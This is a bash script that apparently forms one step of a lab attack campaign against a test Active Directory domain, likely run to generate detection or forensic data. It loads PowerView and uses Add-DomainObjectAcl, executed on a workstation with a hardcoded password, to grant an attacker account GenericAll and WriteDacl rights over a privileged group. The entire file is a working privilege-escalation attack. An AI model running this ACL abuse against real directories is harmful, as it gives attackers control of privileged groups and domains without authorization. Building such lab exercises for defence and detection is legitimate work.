#!/usr/bin/env bash
# T013 — ACL WriteDacl from ws01 (analyst_t1) → dc02 child domain
# Uses PowerView.ps1 to grant GenericAll on Command-Cadre group to attack user.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T013-WRITEDACL-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T013 WriteDacl | ${CASE_ID} | T0=${T0} ==="

DC02="${DC02:-dc02.child.cadre.local}"
DOMAIN_ROOT="${DOMAIN_ROOT:-cadre.local}"
ATTACK_USER="${ATTACK_USER:-analyst_dfir}"
TARGET_DN="CN=Command-Cadre,OU=Command,DC=cadre,DC=local"

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
$u = "'''"${DOMAIN_ROOT}\${ATTACK_USER}"'''";
$dn = "'''"${TARGET_DN}"'''";
Add-DomainObjectAcl -Identity $dn -PrincipalIdentity $u -Rights All -DomainController "'''"${DC02}"'''" -Verbose;
Write-Output "T013_OK: granted GenericAll/WriteDacl to $u on $dn"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T013 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T013 run complete ==="
